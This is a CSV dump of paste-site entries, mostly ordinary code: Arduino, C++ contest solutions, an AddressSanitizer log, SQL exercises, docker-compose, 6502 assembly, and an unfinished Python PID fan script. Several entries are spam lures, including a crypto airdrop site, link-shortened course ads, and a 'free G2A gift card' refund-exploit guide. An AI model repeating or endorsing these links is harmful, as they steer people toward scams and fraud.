id,title,username,language,date,content
zm9d4Ki5,data823,TestGuy1,JSON,Friday 26th of January 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'd3472cedefc8df5bf5aef9824c47a76724be103db75e71b786361fbba32efca37061cd13c51ada6c58c4ae10387ebc04440f83e76d626162f429b85ba612b2c50a97f9f946668b88a4390409f24263ccd64ff42a09cd97c7ab554617e2bce74a19bc219189d5930f62bd9509e2f3f526136473a492d4900209870eb77f87e64f',
  otherdata: [
    '75b92b2d2cc92392db7956e72aff71e3',
    '533b16c032b59d24ac545d9ac146a9ea',
    '34a7625388ae007d4a38bead40619d18',
    'a687e215ada3a1d26c5e9d412dac4f97',
    'a67cefec91cb03ed236b36aa3b75ae13',
    '6eb37d5485f618da8101bb1d84eccf95',
    '726c5260dc1f26c4342f6615b22839d3',
    '04159667e46138c9fe7ea413db6ab90c'
  ]
}"
yLgHYEZC,stepper_jan26,uuu000,C++,Friday 26th of January 2024 05:53:18 AM CDT,"// Include the AccelStepper Library
#include <AccelStepper.h>

// Define pin connections
const int dirPin = 2;
const int stepPin = 3;

// Define motor interface type
#define motorInterfaceType 1

// Creates an instance
AccelStepper myStepper(motorInterfaceType, stepPin, dirPin);

void setup() {
	// set the maximum speed, acceleration factor,
	// initial speed and the target position
	myStepper.setMaxSpeed(1000);
	myStepper.setAcceleration(50);
	myStepper.setSpeed(400);
	myStepper.moveTo(400);
}

void loop() {
	// Change direction once the motor reaches target position
	if (myStepper.distanceToGo() == 0) 
		myStepper.moveTo(-myStepper.currentPosition());

	// Move the motor one step
	myStepper.run();
}"
TnmGKTmU,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Friday 26th of January 2024 05:48:44 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

459844"
8LJMe5DJ,AsanVector,cepxuozab,C++,Friday 26th of January 2024 05:42:14 AM CDT,"==9600==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x1270b27a0380 at pc 0x7ffcbe0846cf bp 0x0073e1afdce0 sp 0x0073e1afd480
WRITE of size 16 at 0x1270b27a0380 thread T0
==9600==WARNING: Failed to use and restart external symbolizer!
    #0 0x7ffcbe0846ce in _asan_wrap_memset+0x19e (C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.38.33130\bin\HostX64\x64\clang_rt.asan_dynamic-x86_64.dll+0x1800346ce)
    #1 0x7ff6abed1d33 in std::_Fill_zero_memset<int *> C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.38.33130\include\xutility:5003
    #2 0x7ff6abed4b88 in std::fill<int *,int> C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.38.33130\include\xutility:5036
    #3 0x7ff6abed7783 in SimpleVector<int>::Resize C:\Users\Dell\Downloads\project (2)\simple_vector.h:202
    #4 0x7ff6abed65d4 in SimpleVector<int>::Insert C:\Users\Dell\Downloads\project (2)\simple_vector.h:118
    #5 0x7ff6abedbeb8 in Test2 C:\Users\Dell\Downloads\project (2)\tests.h:221
    #6 0x7ff6abed1074 in main C:\Users\Dell\Downloads\project (2)\main.cpp:13
    #7 0x7ff6abede0c8 in invoke_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:78
    #8 0x7ff6abede01d in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #9 0x7ff6abeddedd in __scrt_common_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:330
    #10 0x7ff6abede13d in mainCRTStartup D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_main.cpp:16
    #11 0x7ffd2d727613 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017613)
    #12 0x7ffd2f6226b0 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x1800526b0)

0x1270b27a0380 is located 0 bytes to the right of 16-byte region [0x1270b27a0370,0x1270b27a0380)
allocated by thread T0 here:
    #0 0x7ff6abedcffe in operator new[] D:\a\_work\1\s\src\vctools\asan\llvm\compiler-rt\lib\asan\asan_win_new_array_thunk.cpp:41
    #1 0x7ff6abed549b in ArrayPtr<int>::ArrayPtr<int> C:\Users\Dell\Downloads\project (2)\array_ptr.h:17
    #2 0x7ff6abed589f in SimpleVector<int>::SimpleVector<int> C:\Users\Dell\Downloads\project (2)\simple_vector.h:41
    #3 0x7ff6abedbe16 in Test2 C:\Users\Dell\Downloads\project (2)\tests.h:220
    #4 0x7ff6abed1074 in main C:\Users\Dell\Downloads\project (2)\main.cpp:13
    #5 0x7ff6abede0c8 in invoke_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:78
    #6 0x7ff6abede01d in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #7 0x7ff6abeddedd in __scrt_common_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:330
    #8 0x7ff6abede13d in mainCRTStartup D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_main.cpp:16
    #9 0x7ffd2d727613 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017613)
    #10 0x7ffd2f6226b0 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x1800526b0)

SUMMARY: AddressSanitizer: heap-buffer-overflow (C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.38.33130\bin\HostX64\x64\clang_rt.asan_dynamic-x86_64.dll+0x1800346ce) in _asan_wrap_memset+0x19e
Shadow bytes around the buggy address:
  0x04bac8c74020: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0x04bac8c74030: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0x04bac8c74040: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0x04bac8c74050: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fa
  0x04bac8c74060: fa fa fd fa fa fa fd fa fa fa fd fd fa fa 00 00
=>0x04bac8c74070:[fa]fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x04bac8c74080: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x04bac8c74090: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x04bac8c740a0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x04bac8c740b0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x04bac8c740c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb"
8zfWw5dS,puncakes,D_L3,C++,Friday 26th of January 2024 05:34:42 AM CDT,"#include <map>
#include <set>
#include <list>
#include <cmath>
#include <ctime>
#include <deque>
#include <queue>
#include <stack>
#include <string>
#include <bitset>
#include <cstdio>
#include <limits>
#include <vector>
#include <climits>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <numeric>
#include <sstream>
#include <iostream>
#include <algorithm>
#include <unordered_map>

using namespace std;


size_t result = -1;

void binarySearch(size_t min, size_t max, size_t target, const vector<size_t>& times){
    while(min <= max){
        size_t mid = min + (max - min) / 2;
        size_t pancakesSorFar = 0;
        for(size_t time : times)
            pancakesSorFar += (mid / time);

        if(pancakesSorFar >= target){
            result = mid;
            max = mid - 1;
        }
        else{
            min = mid + 1;
        }
    }
}

int main() {
    size_t n, k;
    cin >> n >> k;
    size_t maxTime = 0;
    vector<size_t> times(k);
    for(size_t i =0; i < k; i++){
        cin >> times[i];

        if(times[i] > maxTime)
            maxTime = times[i];
    }
    binarySearch(1, n * maxTime, n, times);
    
    cout << result;
    return 0;
}"
LJ3mPd3R,Untitled,Rofyda_Elghadban1,C++,Friday 26th of January 2024 05:24:48 AM CDT," #include <bits/stdc++.h> 
 #define ll long long
 #define ull unsigned long long
 #define pi 3.141592654
 #define NUM 1e18
 #define Mod  1'000'000'007
 #define fixed(n) fixed<<setprecision(n)
 #define cin(v) for(auto &i:v) cin >> i ;
 #define cout(v) for(auto &i:v) cout << i  <<"" "";
 #define vowel(x) (x=='e'||x=='a'||x=='i'||x=='o'||x=='u')
 #define small(x) (x>=97&&x<=122)
 #define capital(x) (x>=65&&x<=90)
 #define Tolower(s) transform(s.begin(),s.end(),s.begin(),::tolower);
 #define Toupper(s) transform(s.begin(),s.end(),s.begin(),::toupper); 
 #define sz(x) (int)(x.size())
 #define all(v) ((v).begin()), ((v).end())
 #define allr(v) ((v).rbegin()), ((v).rend())
 #define updmax(a,b) a=max(a,b)
 #define updmin(a,b) a=min(a,b)
 #define ceil(a,b) ((a/b)+(a%b?1:0))
 /* asc -> 1 2 3 ,des -> 3 2 1 */

 /***********************************************************************************/
 using namespace std;
 void Rofyda_Elghadban(){
  #ifndef ONLINE_JUDGE   
    freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout);
   #endif
    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);
 }

 bool student(int n,int s,vector<int>v){
  sort(all(v));
  for(int i=0;i<n;i++){
    if((i+s-1)<n&&(v[i+s-1]-v[i])<=5&&s<=n){
      return true;
    }
  }
  return false;
 }

 void solve(){
  int n,s;
  cin>>n>>s;
  vector<int>v(n);
  cin(v);
  cout<<student(n,s,v)<<""\n"";
 }

 int main(){
  Rofyda_Elghadban(); 
  // int t;
  // cin>>t;
  // while(t--){
  //   solve();
  // }
  solve();
  return 0;
 }

"
eLBmtiFj,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Friday 26th of January 2024 05:08:47 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_723606.pdf
 
Working as of
26 January 2024"
tUrnkYZS,Untitled,rkj,MySQL,Friday 26th of January 2024 05:05:16 AM CDT,"-- 1. Wyświetl rozmiary utworów należących do gatunków, których nazwa składa się z co najmniej dwóch słów.
-- Wyniki posortuj według czasu trwania w porządku malejącym
SELECT t.bytes
FROM tracks t
JOIN genres g ON g.genre_id = t.genre_id
WHERE LEN(g.name) - LEN(REPLACE(g.name, ' ', '')) >= 1
ORDER BY t.milliseconds DESC

-- 2. Wyświetl imiona i nazwiska klientów, którzy złożyli zamówienie w marcu albo we wrześniu. Zastosuj aliay imie, nazwisko
SELECT c.first_name AS imie, c.last_name AS nazwisko
FROM customers c
JOIN orders o ON o.customer_id = c.customer_id
WHERE MONTH(o.order_date) = 3 OR MONTH(o.order_date) = 9

-- 3. Wyświetl tytuły utworów które nie naleza do playlisty
SELECT t.title
FROM tracks t
LEFT JOIN playlists_tracks pt ON pt.track_id = t.track_id
WHERE pt.playlist_id IS NULL

-- 4.Dla każdego artysty wyświetl jego nazwę oraz średni czas jego utworów. Uwzględni tylko tych gdzie ta wartość < 250000
SELECT a.name, AVG(t.milliseconds)
FROM artists a
JOIN albums al ON a.artist_id = al.artist_id
JOIN tracks t ON t.album_id = al.album_id
GROUP BY a.name
HAVING AVG(t.milliseconds) < 250000

-- 5.Wyświetl imiona i nazwiska klientów, którzy złożyli najwięcej zamówień
SELECT c.first_name, c.last_name, COUNT(o.order_id)
FROM customers c
JOIN orders o ON o.customer_id = c.customer_id
GROUP BY c.first_name, c.last_name
HAVING COUNT(o.order_id) >= ALL (
	SELECT COUNT(o2.order_id)
	FROM customers c2
	JOIN orders o2 ON o2.customer_id = c2.customer_id
	GROUP BY c2.customer_id
)
-- 6.Dla każego zamówienia wyświetl jego datę oraz tytuły zakupionych utworów o najmniejszym rozmiarze
SELECT o.order_date, t.title
FROM orders o
JOIN orders_tracks ot ON ot.order_id = o.order_id
JOIN tracks t ON t.track_id = ot.track_id
WHERE t.bytes = (
	 SELECT MAX(t2.bytes)
	 FROM tracks t2
	 JOIN orders_tracks ot2 ON ot2.track_id = t2.track_id
	 JOIN orders o2 ON o2.order_id = ot2.order_id
	 WHERE o2.order_id = o.order_id
)"
Ca8qzPnF,Untitled,Alandil,Bash,Friday 26th of January 2024 05:00:56 AM CDT,"version: ""2.1""
secrets:
    SECRET_TOKEN:
        file: /mnt/NVME1/home/fabien/secrets/token.txt

services:
    duckdns:
        image: lscr.io/linuxserver/duckdns:latest
        container_name: duckdns-tst
        # ###############
        labels:
        # Le label ci-dessous permet à Diun de notifier la présence de nouvelle mise à jour
        # Cela peut être supprimé si Diun n'est pas utilisé.
            - diun.enable=true
        # Le label ci-dessous permet à DeUnhealth de redémarrer automatiquement le conteneur
        # Cela peut être supprimé si DeUnhealth n'est pas utilisé.
            - deunhealth.restart.on.unhealthy=true
        # ###############
        secrets:
            - SECRET_TOKEN
        # ###############
        networks:
            default:
        # Définition de l'adresse IP du conteneur à l'intérieur du bridge
                ipv4_address: 172.99.0.2
        # ###############
        environment:
            - PUID=${PUID}
            - PGID=${PGID}
            - TZ=${TZ}
        # Définition des sous-domaines de DuckDNS à mettre à jour sur l'IP externe de la machine.  
        # Possible d'en définir plus d'un avec une virgule entre chaque
            - SUBDOMAINS=${SUBDOMAINS}
            - FILE__TOKEN=/run/secrets/SECRET_TOKEN
            - LOG_FILE=false #optional
        # ###############
        volumes:
            - ${RACINE_CONF_CONTENEURS}/duckdns/:/config #optional
        # ###############
        restart: unless-stopped
        # ###############


networks:
    #Définition du bridge utilisé par l'ensemble des conteneurs configurés dans ce stack
    default:
        name: test_network
        driver: bridge
        ipam:
            config:
                - subnet: 172.99.0.0/24
                  gateway: 172.99.0.1"
y7xG2cG4,Untitled,sissou123,Java,Friday 26th of January 2024 04:56:33 AM CDT,"Java In-Depth: Become a Complete Java Engineer!
Comprehensive Java programming course integrated with design principles, best practices &amp; instructor-led Java EE project
 
What you'll learn
An industry-vetted, comprehensive curriculum to help you master Core & Advanced Java including JVM internals
Master design principles, best practices and coding conventions for writing well-designed, professional Java code 
for more:https://linkjust.com/3iUiw0zeZGWafGmHqvy5F5zTd6j
"
2BrhmK6j,Решение 19-21 перебором,Apollinaria,Python,Friday 26th of January 2024 04:54:39 AM CDT,"#1
'''r = [[0] * 150 for _ in range(150)]
for x in range(57, 0, -1):
    for y in range(57, 0, -1):
        m = [((x*2), y), (x+1, y), (x, y*2), (x,y+1)]
        if any(sum(h) >= 63 for h in m):
            r[x][y] = 1
        elif all(r[a][b] == 1 for a, b in m):
            r[x][y] = 2
        elif any(r[a][b] == 2 for a, b in m):
            r[x][y] = 3
        elif all(r[a][b] in (1,3) for a, b in m):
            r[x][y] = 4
#print(min(s for s in range(1, 58) if r[5][s] == 2)) # 19
print([s for s in range(1, 58) if r[5][s] == 3][:2]) # 20
print(min(s for s in range(1, 58) if r[5][s] == 4)) #21'''

#2
'''r = [[0] * 250 for _ in range(250)]
for x in range(41, 0, -1):
    for y in range(41, 0, -1):
        m = [(x*2, y), (x+2, y), (x, y*2), (x,y+2)]
        if any(h[0]*h[1] >= 123 for h in m):
            r[x][y] = 1
        elif all(r[a][b] == 1 for a, b in m):
            r[x][y] = 2
        elif any(r[a][b] == 2 for a, b in m):
            r[x][y] = 3
        elif all(r[a][b] in (1,3) for a, b in m):
            r[x][y] = 4
#print(max(s for s in range(1, 41) if r[3][s] == 2)) # 19
print([s for s in range(1, 41) if r[3][s] == 3][-2:]) #20
print(max(s for s in range(1, 41) if r[3][s] == 4)) # 21'''

#4
'''r = [[0] * 90 for _ in range(90)]
for x in range(39, 0, -1):
    for y in range(39, 0, -1):
        if x==y: m = [(x,y+1), (x,y+2), (x,y+3), (x+1,y), (x+2,y), (x+3,y)]
        if x < y: m = [(x*2, y), (x,y+1), (x,y+2), (x,y+3)]
        if x > y: m = [(x, y*2), (x+1,y), (x+2,y), (x+3,y)]
        if any((h[0]>=40 or h[1]>=40) for h in m):
            r[x][y] = 1
        elif all(r[a][b] == 1 for a, b in m):
            r[x][y] = 2
        elif any(r[a][b] == 2 for a, b in m):
            r[x][y] = 3
        elif all(r[a][b] in (1,3) for a, b in m):
            r[x][y] = 4
print(min(s+t for s in range(1, 40) for t in range(1, 40) if r[t][s] == 1)) # 19
print(*[s for s in range(1, 40) if r[11][s] == 3 and r[11][s] != 1]) # 20
print(*[s for s in range(1, 40) if r[31][s] == 4]) # 21'''

#6
'''r = [0]*200
for s in range(165, 0, -1):
    for j in range(2, 82):
        m = [s+10, s+2]
        if s*j - s <= 80:
            m += [s*j]
        if any(x >= 166 for x in m):
            r[s] = 1
        elif all(r[x] == 1 for x in m):
            r[s] = 2
        elif any(r[x] == 2 for x in m):
            r[s] = 3
        elif all(r[x] in (1, 3) for x in m):
            r[s] = 4
#print(min(s for s in range(1, 166) if r[s] == 3)) # 19
print(*[s for s in range(1, 166) if r[s] == 3]) # 20
print(min(s for s in range(1, 166) if r[s] == 4)) # 21'''

#7
'''r = [0]*56*3
for s in range(1,40):
    m = [s - 1, s - 2, s - 3, s - 4, s - 5]
    if s % 2 == 0:
        m += [s // 2]
    if any(x < 10 for x in m):
        r[s] = 1
    elif all(r[x] == 1 for x in m):
        r[s] = 2
    elif any(r[x] == 2 for x in m):
        r[s] = 3
    elif all(r[x] in (1, 3) for x in m):
        r[s] = 4
print(*[s for s in range(1, 56) if r[s] == 2]) # 19
print(*[s for s in range(1, 56) if r[s] == 3]) # 20
print(*[s for s in range(1, 56) if r[s] == 4]) # 21'''"
dhpAZja3,new easy6502 blit routine,Kitomas,6502 ACME Cross Assembler,Friday 26th of January 2024 04:48:20 AM CDT,"define r16al  $f0
define r16ah  $f1
define r16bl  $f2
define r16bh  $f3
define r16cl  $f4
define r16ch  $f5
define arg0   $f6
define arg1   $f7

define tmp0   $fc
define tmp1   $fd

define random $fe
define key    $ff


init:
  lda #$00
  ldx #<amoog
  ldy #>amoog
  sta pos
loop:
  lda random
  jsr blit
  jmp loop


amoog:
  dcb  0,10,10,10
  dcb 10,10, 3, 3
  dcb 10,10,10,10
  dcb  0,10, 0,10



;(automatically loads pos into A)
pos: dcb 0
pos_loadInc:
  lda pos
  sta tmp0
  inc pos
  lda pos
  and #%00001000
  beq pos_loadInc_noYInc
  
  lda pos
  and #%01110111
  clc
  adc #16
  sta pos

  pos_loadInc_noYInc:
  lda tmp0
  rts



;blits a 4x4 color tile
 ;(restores A,X,Y)
;A = position (as #$YX)
;X = color (0 -> 15)
blit_color:
  ;(X is read-only here; storing is unnecessary)
  sta arg0 ;store arguments
  sty arg1  ;^^
  jsr blit_load_dst ;load dst addr to r16a

  ;completely unrolled loop
  ldy #0        ;init index to 0
  txa           ;pixel 0
  sta (r16al),y  ;^^
  iny            ;^^
  sta (r16al),y ;pixel 1
  iny            ;^^
  sta (r16al),y ;pixel 2
  iny            ;^^
  sta (r16al),y ;pixel 3
  tya            ;^^
  clc            ;^^
  adc #29        ;^^
  tay            ;^^
  txa           ;pixel 4
  sta (r16al),y  ;^^
  iny            ;^^
  sta (r16al),y ;pixel 5
  iny            ;^^
  sta (r16al),y ;pixel 6
  iny            ;^^
  sta (r16al),y ;pixel 7
  tya            ;^^
  clc            ;^^
  adc #29        ;^^
  tay            ;^^
  txa           ;pixel 8
  sta (r16al),y  ;^^
  iny            ;^^
  sta (r16al),y ;pixel 9
  iny            ;^^
  sta (r16al),y ;pixel 10
  iny            ;^^
  sta (r16al),y ;pixel 11
  tya            ;^^
  clc            ;^^
  adc #29        ;^^
  tay            ;^^
  txa           ;pixel 12
  sta (r16al),y  ;^^
  iny            ;^^
  sta (r16al),y ;pixel 13
  iny            ;^^
  sta (r16al),y ;pixel 14
  iny            ;^^
  sta (r16al),y ;pixel 15

  lda arg0 ;restore registers
  ldy arg1  ;^^
  rts


;blits a 4x4 bitmap tile
 ;(restores A,X,Y)
;A = position (as #$YX)
;X = bitmap addr lo byte
;Y = bitmap addr hi byte
blit:
  sta arg0          ;store arguments
  stx r16bl          ;^^
  sty r16bh          ;^^
  jsr blit_load_dst ;load dst addr to r16a

  ;completely unrolled loop
  ldy #0        ;pixel 0,0 (0,0)
  lda (r16bl),y  ;^^
  sta (r16al),y  ;^^
  iny            ;^^
  lda (r16bl),y ;pixel 1,0 (1,1)
  sta (r16al),y  ;^^
  iny            ;^^
  lda (r16bl),y ;pixel 2,0 (2,2)
  sta (r16al),y  ;^^
  iny            ;^^
  lda (r16bl),y ;pixel 3,0 (3,3)
  sta (r16al),y  ;^^
  iny            ;^^
  sty tmp0       ;^^
  tya            ;^^
  clc            ;^^
  adc #28        ;^^
  sta tmp1       ;^^

  lda (r16bl),y ;pixel 0,1 (4,32)
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  iny            ;^^
  sty tmp1       ;^^
  ldy tmp0      ;pixel 1,1 (5,33)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  iny            ;^^
  sty tmp1       ;^^
  ldy tmp0      ;pixel 2,1 (6,34)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  iny            ;^^
  sty tmp1       ;^^
  ldy tmp0      ;pixel 3,1 (7,35)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  tya            ;^^
  clc            ;^^
  adc #29        ;^^
  sta tmp1       ;^^

  ldy tmp0      ;pixel 0,2 (4,64)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  iny            ;^^
  sty tmp1       ;^^
  ldy tmp0      ;pixel 1,2 (5,65)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  iny            ;^^
  sty tmp1       ;^^
  ldy tmp0      ;pixel 2,2 (6,66)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  iny            ;^^
  sty tmp1       ;^^
  ldy tmp0      ;pixel 3,2 (7,67)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  tya            ;^^
  clc            ;^^
  adc #29        ;^^
  sta tmp1       ;^^

  ldy tmp0      ;pixel 0,3 (4,96)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  iny            ;^^
  sty tmp1       ;^^
  ldy tmp0      ;pixel 1,3 (5,97)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  iny            ;^^
  sty tmp1       ;^^
  ldy tmp0      ;pixel 2,3 (6,98)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  inc tmp0       ;^^
  iny            ;^^
  sty tmp1       ;^^
  ldy tmp0      ;pixel 3,3 (7,99)
  lda (r16bl),y  ;^^
  ldy tmp1       ;^^
  sta (r16al),y  ;^^
  
  lda arg0  ;restore registers
  ldx r16bl  ;^^
  ldy r16bh  ;^^
  rts


;private routine that loads tile's
 ;destination address into r16a
blit_load_dst:
  tay               ;lookup table offset into Y
  and #%00000111     ;^^
  sta tmp0           ;^^
  tya                ;^^
  lsr                ;^^
  and #%00111000     ;^^
  ora tmp0           ;^^
  asl                ;^^
  tay                ;^^
  lda #<blit_lookup ;lookup table addr. into r16c
  sta r16cl          ;^^
  lda #>blit_lookup  ;^^
  sta r16ch          ;^^
  lda (r16cl),y     ;destination addr. into r16a
  sta r16al          ;^^
  iny                ;^^
  lda (r16cl),y      ;^^
  sta r16ah          ;^^
  rts


blit_lookup:
dcb $00,$02,$04,$02,$08,$02,$0c,$02,$10,$02,$14,$02,$18,$02,$1c,$02
dcb $80,$02,$84,$02,$88,$02,$8c,$02,$90,$02,$94,$02,$98,$02,$9c,$02
dcb $00,$03,$04,$03,$08,$03,$0c,$03,$10,$03,$14,$03,$18,$03,$1c,$03
dcb $80,$03,$84,$03,$88,$03,$8c,$03,$90,$03,$94,$03,$98,$03,$9c,$03
dcb $00,$04,$04,$04,$08,$04,$0c,$04,$10,$04,$14,$04,$18,$04,$1c,$04
dcb $80,$04,$84,$04,$88,$04,$8c,$04,$90,$04,$94,$04,$98,$04,$9c,$04
dcb $00,$05,$04,$05,$08,$05,$0c,$05,$10,$05,$14,$05,$18,$05,$1c,$05
dcb $80,$05,$84,$05,$88,$05,$8c,$05,$90,$05,$94,$05,$98,$05,$9c,$05"
wtk2mziM,Untitled,Josif_tepe,C++,Friday 26th of January 2024 04:46:11 AM CDT,"#include <iostream>
using namespace std;
int main() {
    int n;
    cin >> n;
    int cifri = 0;
    if(n == 0) {
        cifri = 1;
    }
    for(int i = n; i > 0; i /= 10) {
        cifri += 1;
    }
    cout << cifri << endl;
    return 0;
}
"
csJ0VL0i,Untitled,sissou123,Java,Friday 26th of January 2024 04:43:11 AM CDT,"Learn JAVA Programming - Beginner to Master
Deep Dive in Core Java programming -Standard Edition. A Practical approach to learn Java. Become a Java Expert 
What you'll learn
Learn Java Programming for Standard Edition Java SE
Learn Multithreaded Programming
Learn GUI Programming
Learn Database Programming 
for more:https://linkjust.com/J6xDm2utqRv7eWZn4s
"
SARrWHeC,SDA EXAM,D_L3,C++,Friday 26th of January 2024 04:41:12 AM CDT,"#include <map>
#include <set>
#include <list>
#include <cmath>
#include <ctime>
#include <deque>
#include <queue>
#include <stack>
#include <string>
#include <bitset>
#include <cstdio>
#include <limits>
#include <vector>
#include <climits>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <numeric>
#include <sstream>
#include <iostream>
#include <algorithm>
#include <unordered_map>

using namespace std;

void dfs(vector<int>& distances, int start, int sum, unordered_map<int, vector<int>>& graph){
    distances[start] = sum;
    for(int neigh : graph[start]){
        if(distances[neigh] == -1 || distances[neigh] > sum + 1)
            dfs(distances, neigh, sum + 1, graph);
    }
}

void play(){
    int n, m;
    cin >> n >> m;
    vector<int> distances(n, -1);
    unordered_map<int, vector<int>> graph;
    int x, y, index;
    for(int i = 0; i < m; i++){
        cin >> x >> y;
        graph[x - 1].push_back(y - 1);
        graph[y - 1].push_back(x - 1);
    }
    cin >> index;
    
    dfs(distances, index - 1, 0, graph);
    
    for(int i = 0; i < n; i++){
        if(i == index - 1)
            continue;
        cout << max(-1, distances[i] * 6) << "" "";
    }
    cout << endl;
    
}

int main() {
    int q;
    cin >> q;
    for(int i = 0; i < q; i++)
        play();
    return 0;
}"
E2hwU92t,Rpi 5B fan control PID v1,ReDaLeRt_PT,Python,Friday 26th of January 2024 04:37:01 AM CDT,"import os
import time
import math
import json

class PIDController:
    def __init__(self, kp, ki, kd, setpoint):
        self.kp = kp
        self.ki = ki
        self.kd = kd
        self.setpoint = setpoint
        self.prev_error = 0
        self.integral = 0

    def compute(self, current_value):
        error = self.setpoint - current_value
        self.integral += error
        derivative = error - self.prev_error

        output = self.kp * error + self.ki * self.integral + self.kd * derivative

        self.prev_error = error
        return output

def read_temperature():
    # Read CPU temperature from /sys/class/thermal/thermal_zone0/temp
    with open(""/sys/class/thermal/thermal_zone0/temp"", ""r"") as file:
        temperature = int(file.read()) / 1000.0
    return temperature

def read_pid_parameters():
    # Read PID parameters from a file
    try:
        with open(""pid_params.json"", ""r"") as file:
            pid_params = json.load(file)
        return pid_params
    except FileNotFoundError:
        return None

def save_pid_parameters(pid_params):
    # Save PID parameters to a file
    with open(""pid_params.json"", ""w"") as file:
        json.dump(pid_params, file)

def tune_pid_parameters(pid_controller, initial_params, iterations=10):
    best_params = initial_params.copy()
    best_jitter = float('inf')

    for _ in range(iterations):
        # Evaluate jitter for current parameters
        current_jitter = evaluate_pid_performance(pid_controller, best_params)
        
        # Randomly perturb the parameters
        perturbed_params = {
            ""kp"": best_params[""kp""] + 0.1 * (2 * random() - 1),
            ""ki"": best_params[""ki""] + 0.01 * (2 * random() - 1),
            ""kd"": best_params[""kd""] + 0.001 * (2 * random() - 1),
        }

        # Evaluate jitter for perturbed parameters
        perturbed_jitter = evaluate_pid_performance(pid_controller, perturbed_params)

        # Update parameters if perturbed parameters result in lower jitter
        if perturbed_jitter < best_jitter:
            best_params = perturbed_params
            best_jitter = perturbed_jitter

    return best_params

def evaluate_pid_performance(pid_controller, params):
    pid_controller.kp = params[""kp""]
    pid_controller.ki = params[""ki""]
    pid_controller.kd = params[""kd""]

    # Run the system and calculate jitter
    jitter_values = []
    for _ in range(10):
        current_temperature = read_temperature()
        fan_speed = max(0, min(3, math.floor(pid_controller.compute(current_temperature))))
        jitter_values.append(abs(current_temperature - pid_controller.setpoint))

        # Set fan speed by writing to /sys/class/thermal/cooling_device0/cur_state
        fan_speed_path = ""/sys/class/thermal/cooling_device0/cur_state""
        with open(fan_speed_path, ""w"") as file:
            file.write(str(fan_speed))

